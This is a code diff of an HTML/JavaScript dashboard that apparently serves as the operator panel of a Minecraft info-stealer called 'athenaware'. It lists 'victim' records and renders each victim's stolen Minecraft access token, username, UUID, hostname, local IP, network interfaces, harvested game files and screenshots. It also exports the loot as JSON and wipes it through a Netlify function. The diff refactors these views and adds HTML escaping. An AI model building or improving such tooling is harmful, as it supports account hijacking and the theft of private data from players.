-                        <div class="tab-content active">
-                            <h3>Minecraft Files</h3>
-                            <pre>${JSON.stringify(victim.minecraft_files, null, 2)}</pre>
-                        </div>
-                    `;
-                    break;
-                case 'mods':
-                    contentDiv.innerHTML = `
-                        <div class="tab-content active">
-                            <h3>Installed Mods</h3>
-                            <pre>${JSON.stringify(victim.installed_mods, null, 2)}</pre>
-                        </div>
-                    `;
-                    break;
-                case 'screenshots':
-                    let screenshotsHtml = '<div class="tab-content active"><h3>Screenshots</h3><div class="screenshot-grid">';
-                    
-                    if (victim.screenshots && victim.screenshots.length > 0) {
-                        victim.screenshots.forEach(ss => {
-                            screenshotsHtml += `
-                                <div class="screenshot-item">
-                                    <img src="data:image/png;base64,${ss.data}" onclick="window.open(this.src)">
-                                    <p>${ss.filename}</p>
-                                </div>
-                            `;
-                        });
-                    } else {
-                        screenshotsHtml += '<p>No screenshots available</p>';
-                    }
-                    
-                    screenshotsHtml += '</div></div>';
-                    contentDiv.innerHTML = screenshotsHtml;
-                    break;
-            }
-        }
-
+        // Close modal
         function closeModal() {
             document.getElementById('victimModal').style.display = 'none';
+            selectedVictim = null;
         }
 
-        function clearAllData() {
-            if (confirm('Are you sure you want to delete all victim data?')) {
-                fetch('/.netlify/functions/clear-data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ password: currentPassword })
-                })
-                .then(() => {
-                    currentData = [];
-                    updateStats();
-                    renderVictims();
-                })
-                .catch(() => {
-                    currentData = [];
-                    updateStats();
-                    renderVictims();
-                });
+        // Show specific tab in modal
+        function showTab(tabName) {
+            if (!selectedVictim) return;
+
+            // Update active tab
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.textContent.toLowerCase().includes(tabName) || 
+                    (tabName === 'minecraft' && btn.textContent === 'Minecraft')) {
+                    btn.classList.add('active');
+                }
+            });
+
+            const modalBody = document.getElementById('modalBody');
+            const victim = selectedVictim;
+
+            switch(tabName) {
+                case 'minecraft':
+                    modalBody.innerHTML = renderMinecraftTab(victim);
+                    break;
+                case 'system':
+                    modalBody.innerHTML = renderSystemTab(victim);
+                    break;
+                case 'files':
+                    modalBody.innerHTML = renderFilesTab(victim);
+                    break;
+                case 'screenshots':
+                    modalBody.innerHTML = renderScreenshotsTab(victim);
+                    break;
+                case 'raw':
+                    modalBody.innerHTML = renderRawTab(victim);
+                    break;
+                default:
+                    modalBody.innerHTML = renderMinecraftTab(victim);
             }
         }
 
-        // Load on page load
-        window.onload = fetchData;
+        // Render Minecraft tab
+        function renderMinecraftTab(victim) {
+            const mc = victim.minecraft_data || {};
+            const token = mc.access_token || 'Not available';
+            const username = mc.username || 'Unknown';
+            const uuid = mc.uuid || 'Unknown';
+            const server = mc.server_address || 'None';
+
+            return `
+                <div class="data-section">
+                    <h3>Account Information</h3>
+                    <div class="data-card">
+                        <div class="data-grid">
+                            <div class="data-item">
+                                <div class="label">Username</div>
+                                <div class="value">${escapeHtml(username)}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">UUID</div>
+                                <div class="value">${escapeHtml(uuid)}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">Last Server</div>
+                                <div class="value">${escapeHtml(server)}</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="data-section">
+                    <h3>Access Token</h3>
+                    <div class="token-display">${escapeHtml(token)}</div>
+                </div>
+            `;
+        }
+
+        // Render System tab
+        function renderSystemTab(victim) {
+            const sys = victim.system_info || {};
+            const network = victim.network_interfaces || [];
+
+            let networkHtml = '';
+            if (network.length > 0) {
+                networkHtml = '<div class="data-section"><h3>Network Interfaces</h3><div class="data-card">';
+                network.forEach(iface => {
+                    if (iface.ip_addresses) {
+                        networkHtml += `<div style="margin-bottom: 12px;">
+                            <strong style="color: #f97316;">${escapeHtml(iface.name)}</strong>
+                            <div style="font-family: monospace; margin-top: 4px;">${escapeHtml(iface.ip_addresses.join(', '))}</div>
+                        </div>`;
+                    }
+                });
+                networkHtml += '</div></div>';
+            }
+
+            return `
+                <div class="data-section">
+                    <h3>System Information</h3>
+                    <div class="data-card">
+                        <div class="data-grid">
+                            <div class="data-item">
+                                <div class="label">OS</div>
+                                <div class="value">${escapeHtml(sys.os || 'Unknown')}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">Version</div>
+                                <div class="value">${escapeHtml(sys.os_version || 'Unknown')}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">Architecture</div>
+                                <div class="value">${escapeHtml(sys.os_arch || 'Unknown')}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">Username</div>
+                                <div class="value">${escapeHtml(sys.user || 'Unknown')}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">Hostname</div>
+                                <div class="value">${escapeHtml(sys.hostname || 'Unknown')}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">Local IP</div>
+                                <div class="value">${escapeHtml(sys.local_ip || sys.ip || 'Unknown')}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">Java Version</div>
+                                <div class="value">${escapeHtml(sys.java_version || 'Unknown')}</div>
+                            </div>
+                            <div class="data-item">
+                                <div class="label">CPU Cores</div>
+                                <div class="value">${escapeHtml(sys.cpu_cores || 'Unknown')}</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                ${networkHtml}
+            `;
+        }
+
+        // Render Files tab
+        function renderFilesTab(victim) {
+            const files = victim.minecraft_files || {};
+
+            if (Object.keys(files).length === 0) {
+                return '<div class="empty-text">No Minecraft files collected</div>';
+            }
+
+            let html = '<div class="data-section"><h3>Minecraft Files</h3>';
+
+            for (const [filename, content] of Object.entries(files)) {
+                let displayContent = content;
+                if (content && content.length > 500) {
+                    displayContent = content.substring(0, 500) + '...\n[Content truncated]';
+                }
+
+                html += `
+                    <div style="margin-bottom: 20px;">
+                        <h4 style="color: #f97316; margin-bottom: 8px;">${escapeHtml(filename)}</h4>
+                        <pre>${escapeHtml(displayContent)}</pre>
+                    </div>
+                `;
+            }
+
+            html += '</div>';
+            return html;
+        }
+
+        // Render Screenshots tab
+        function renderScreenshotsTab(victim) {
+            const screenshots = victim.screenshots || [];
+
+            if (screenshots.length === 0) {
+                return '<div class="empty-text">No screenshots available</div>';
+            }
+
+            let html = '<div class="screenshot-grid">';
+
+            screenshots.forEach(ss => {
+                const imgData = ss.data || '';
+                const filename = ss.filename || 'screenshot.png';
+                
+                html += `
+                    <div class="screenshot-item">
+                        <img src="data:image/png;base64,${imgData}" alt="${escapeHtml(filename)}" onclick="window.open(this.src)">
+                        <div class="filename">${escapeHtml(filename)}</div>
+                    </div>
+                `;
+            });
+
+            html += '</div>';
+            return html;
+        }
+
+        // Render Raw JSON tab
+        function renderRawTab(victim) {
+            return `
+                <div class="data-section">
+                    <h3>Raw JSON Data</h3>
+                    <pre>${escapeHtml(JSON.stringify(victim, null, 2))}</pre>
+                </div>
+            `;
+        }
+
+        // Export data as JSON
+        function exportData() {
+            const dataStr = JSON.stringify(currentData, null, 2);
+            const blob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `athenaware_export_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Clear all data
+        async function clearAllData() {
+            if (!confirm('⚠️ Are you sure you want to delete ALL victim data? This cannot be undone.')) {
+                return;
+            }
+
+            try {
+                const response = await fetch('/.netlify/functions/clear-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password: API_PASSWORD })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    currentData = [];
+                    updateUI();
+                    closeModal();
+                } else {
+                    alert('Failed to clear data');
+                }
+            } catch (error) {
+                console.error('Clear error:', error);
+                alert('Error clearing data');
+            }
+        }
+
+        // Helper: Show loading state
+        function showLoading(isLoading) {
+            // Could add a loading spinner here
+        }
+
+        // Helper: Show error message
+        function showError(message) {
+            const contentArea = document.getElementById('contentArea');
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message';
+            errorDiv.textContent = message;
+            contentArea.prepend(errorDiv);
+            
+            setTimeout(() => errorDiv.remove(), 5000);
+        }
+
+        // Helper: Escape HTML to prevent XSS
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
 
         // Close modal when clicking outside
         window.onclick = function(event) {
             const modal = document.getElementById('victimModal');
-            if (event.target == modal) {
-                modal.style.display = 'none';
+            if (event.target === modal) {
+                closeModal();
             }
         }
+
+        // Clean up on page unload
+        window.onbeforeunload = function() {
+            if (autoRefreshInterval) {
+                clearInterval(autoRefreshInterval);
+            }
+        };
     </script>
 </body>
 </html>
